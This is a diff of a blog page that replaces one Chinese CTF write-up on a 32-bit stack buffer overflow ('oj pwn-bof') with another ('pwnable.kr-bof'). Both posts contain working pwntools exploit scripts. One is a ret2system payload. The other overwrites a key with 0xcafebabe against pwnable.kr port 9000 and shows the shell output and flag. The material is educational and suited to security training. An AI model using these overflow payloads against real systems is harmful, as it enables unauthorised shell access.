@@ -15,22 +15,18 @@
 
 
 
-<meta name="description" content="bof之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。">
+<meta name="description" content="pwnable.kr-bof昨天整理了一下论文，打印上交，把答辩PPT做完，没有做题。">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="oj pwn-bof">
-<meta property="og:url" content="https://hanqd.github.io/2019/04/19/oj pwn bof/index.html">
+<meta property="og:title" content="pwnable.kr-bof">
+<meta property="og:url" content="https://hanqd.github.io/2019/05/21/pwnable bof/index.html">
 <meta property="og:site_name" content="HANqd&#39;s BLOG">
-<meta property="og:description" content="bof之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。">
+<meta property="og:description" content="pwnable.kr-bof昨天整理了一下论文，打印上交，把答辩PPT做完，没有做题。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/71.PNG">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/72.PNG">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/73.PNG">
-<meta property="og:updated_time" content="2019-04-19T12:50:02.611Z">
+<meta property="og:updated_time" content="2019-05-21T12:26:45.344Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="oj pwn-bof">
-<meta name="twitter:description" content="bof之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。">
-<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/71.PNG">
+<meta name="twitter:title" content="pwnable.kr-bof">
+<meta name="twitter:description" content="pwnable.kr-bof昨天整理了一下论文，打印上交，把答辩PPT做完，没有做题。">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -62,7 +58,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>oj pwn-bof | HANqd&#39;s BLOG</title>
+<title>pwnable.kr-bof | HANqd&#39;s BLOG</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -272,11 +268,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-oj pwn bof" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pwnable bof" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/04/19/oj pwn bof/" class="article-date">
-      <time datetime="2019-04-19T12:48:55.890Z" itemprop="datePublished">2019-04-19</time>
+      <a href="/2019/05/21/pwnable bof/" class="article-date">
+      <time datetime="2019-05-21T09:41:10.097Z" itemprop="datePublished">2019-05-21</time>
 </a>
 
 
@@ -291,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      oj pwn-bof
+      pwnable.kr-bof
     </h1>
   
 
@@ -312,24 +308,32 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。<br><a id="more"></a></p>
-<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>题目给了一个文件，在Ubuntu里的命令行里用file，查看一下文件类型，是ELF类型，32位。</p>
-<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ol>
-<li>用IDA32位打开文件，反汇编到C代码，可见下边代码<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_8048573()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  sub_804851B();</span><br><span class="line">  sub_804854A();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"can you pwn me?"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
+        <h2 id="pwnable-kr-bof"><a href="#pwnable-kr-bof" class="headerlink" title="pwnable.kr-bof"></a>pwnable.kr-bof</h2><p>昨天整理了一下论文，打印上交，把答辩PPT做完，没有做题。<br><a id="more"></a></p>
+<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure>
+<p>题目中看到这是一道栈溢出问题。</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>因为之前做过栈溢出的题目，所以有一定了解。</p>
+<ol>
+<li>先下载文件<br>在Linux系统中命令：wget +网址</li>
 </ol>
-<p>根据read函数和buf可以知道，产生了栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hdd@ubuntu:~/Desktop/bof$ wget http://pwnable.kr/bin/bof</span><br><span class="line">hdd@ubuntu:~/Desktop/bof$ wget http://pwnable.kr/bin/bof.c</span><br></pre></td></tr></table></figure>
 <ol start="2">
-<li>查看保护机制<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/71.PNG" alt><br>开启了NX保护。</li>
-<li>计算要覆盖的位数<br>‘a’*0x1c+’a’*4=32</li>
-<li>查看程序中是否有’/bin/sh’<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/72.PNG" alt><br>存在。</li>
-<li>查找一下system是否存在，在ida中查找<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/73.PNG" alt><br>也存在</li>
-<li>于是部署栈中的内容<br><code>payload = flat([&#39;a&#39;*32,system_plt,&#39;b&#39;*4,binsh_addr])</code><br>代码如下：</li>
+<li>查看bof.c文件</li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=remote('pwn1.blue-whale.me',9990)</span></span><br><span class="line">r=process(<span class="string">'./pwn'</span>)</span><br><span class="line">binsh_addr = <span class="number">0x804a02c</span> </span><br><span class="line">system_plt = <span class="number">0x80483f0</span></span><br><span class="line"><span class="comment">#r.recvuntil('can you pwn me?')</span></span><br><span class="line">payload = flat([<span class="string">'a'</span>*<span class="number">32</span>,system_plt,<span class="string">'b'</span>*<span class="number">4</span>,binsh_addr])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>分析代码，找到会发生溢出的函数，gets(),这里没有对输入进行限制，会造成缓冲区溢出。只要使key值等于0xcafebabe，就会得到系统shell，获得flag。</li>
+<li>查看一下bof的反汇编代码，查看func()的反汇编代码</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000062</span>c &lt;func&gt;:</span><br><span class="line"> <span class="number">62</span>c:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line"> <span class="number">62</span>d:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line"> <span class="number">62</span>f:	<span class="number">83</span> ec <span class="number">48</span>             	sub    $<span class="number">0x48</span>,%esp</span><br><span class="line"> <span class="number">632</span>:	<span class="number">65</span> a1 <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line"> <span class="number">638</span>:	<span class="number">89</span> <span class="number">45</span> f4             	mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">63</span>b:	<span class="number">31</span> c0                	xor    %eax,%eax</span><br><span class="line"> <span class="number">63</span>d:	c7 <span class="number">04</span> <span class="number">24</span> <span class="number">8</span>c <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x78c</span>,(%esp)</span><br><span class="line"> <span class="number">644</span>:	e8 fc ff ff ff       	call   <span class="number">645</span> &lt;func+<span class="number">0x19</span>&gt;</span><br><span class="line"> <span class="number">649</span>:	<span class="number">8</span>d <span class="number">45</span> d4             	lea    <span class="number">-0x2c</span>(%ebp),%eax</span><br><span class="line"> <span class="number">64</span>c:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">64</span>f:	e8 fc ff ff ff       	call   <span class="number">650</span> &lt;func+<span class="number">0x24</span>&gt;</span><br><span class="line"> <span class="number">654</span>:	<span class="number">81</span> <span class="number">7</span>d <span class="number">08</span> be ba fe ca 	cmpl   $<span class="number">0xcafebabe</span>,<span class="number">0x8</span>(%ebp)</span><br><span class="line"> <span class="number">65</span>b:	<span class="number">75</span> <span class="number">0</span>e                	jne    <span class="number">66</span>b &lt;func+<span class="number">0x3f</span>&gt;</span><br><span class="line"> <span class="number">65</span>d:	c7 <span class="number">04</span> <span class="number">24</span> <span class="number">9</span>b <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x79b</span>,(%esp)</span><br><span class="line"> <span class="number">664</span>:	e8 fc ff ff ff       	call   <span class="number">665</span> &lt;func+<span class="number">0x39</span>&gt;</span><br><span class="line"> <span class="number">669</span>:	eb <span class="number">0</span>c                	jmp    <span class="number">677</span> &lt;func+<span class="number">0x4b</span>&gt;</span><br><span class="line"> <span class="number">66</span>b:	c7 <span class="number">04</span> <span class="number">24</span> a3 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x7a3</span>,(%esp)</span><br><span class="line"> <span class="number">672</span>:	e8 fc ff ff ff       	call   <span class="number">673</span> &lt;func+<span class="number">0x47</span>&gt;</span><br><span class="line"> <span class="number">677</span>:	<span class="number">8</span>b <span class="number">45</span> f4             	mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">67</span>a:	<span class="number">65</span> <span class="number">33</span> <span class="number">05</span> <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	xor    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line"> <span class="number">681</span>:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">688</span> &lt;func+<span class="number">0x5c</span>&gt;</span><br><span class="line"> <span class="number">683</span>:	e8 fc ff ff ff       	call   <span class="number">684</span> &lt;func+<span class="number">0x58</span>&gt;</span><br><span class="line"> <span class="number">688</span>:	c9                   	leave  </span><br><span class="line"> <span class="number">689</span>:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>从649那可以看出，局部变量的地址为edp-0x2c，从654看出，key值的地址在edp+x8，因为是32位的文件，所以构造如下数据进行填充：<br><code>payload=&#39;a&#39;*44+&#39;a&#39;*8+p32(0xcafebabe)</code></p>
+<ol start="5">
+<li>脚本代码</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+<span class="string">'a'</span>*<span class="number">8</span>+p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <ol start="6">
-<li>在Ubuntu里输入命令 python pwn1.py,运行下写的代码，id，获得权限，至此已经成功获得shell。ls获得flag。</li>
+<li>运行脚本，获得flag</li>
 </ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hdd@ubuntu:~/Desktop/bof$ python bof.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -338,13 +342,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/04/19/oj pwn bof/">oj pwn-bof</a></p>
+        <p><span>本文标题:</span><a href="/2019/05/21/pwnable bof/">pwnable.kr-bof</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HANqd</a></p>
-        <p><span>发布时间:</span>2019-04-19, 20:48:55</p>
-        <p><span>最后更新:</span>2019-04-19, 20:50:02</p>
+        <p><span>发布时间:</span>2019-05-21, 17:41:10</p>
+        <p><span>最后更新:</span>2019-05-21, 20:26:45</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/04/19/oj pwn bof/" title="oj pwn-bof">https://hanqd.github.io/2019/04/19/oj pwn bof/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/04/19/oj pwn bof/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/21/pwnable bof/" title="pwnable.kr-bof">https://hanqd.github.io/2019/05/21/pwnable bof/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/05/21/pwnable bof/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -356,16 +360,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/04/21/oj web confusion1/">
-                    oj Web-Confusion1(SSTI攻击)
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/04/17/oj XSS/">
-                    Web babyXSS
+                <a href="/2019/05/19/pwnable-collision/">
+                    pwnable.kr-collision
                 </a>
             </div>
         
@@ -377,7 +375,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">1.</span> <span class="toc-text">bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-kr-bof"><span class="toc-number">1.</span> <span class="toc-text">pwnable.kr-bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -413,7 +411,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"oj pwn-bof　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"pwnable.kr-bof　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -429,7 +427,7 @@
     
       <div class="duoshuo" id="comments">
     <div id="comment-box"></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2019/04/19/oj pwn bof/" data-title="oj pwn-bof" data-url="https://hanqd.github.io/2019/04/19/oj pwn bof/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/05/21/pwnable bof/" data-title="pwnable.kr-bof" data-url="https://hanqd.github.io/2019/05/21/pwnable bof/"></div>
     <script>
         var duoshuoQuery = {short_name:""};
         var loadComment = function(){
@@ -452,15 +450,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/04/21/oj web confusion1/" title="上一篇: oj Web-Confusion1(SSTI攻击)">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/04/17/oj XSS/" title="下一篇: Web babyXSS">
+            <a href="/2019/05/19/pwnable-collision/" title="下一篇: pwnable.kr-collision">
                 <i class="fa fa-angle-right"></i>
             </a>
         
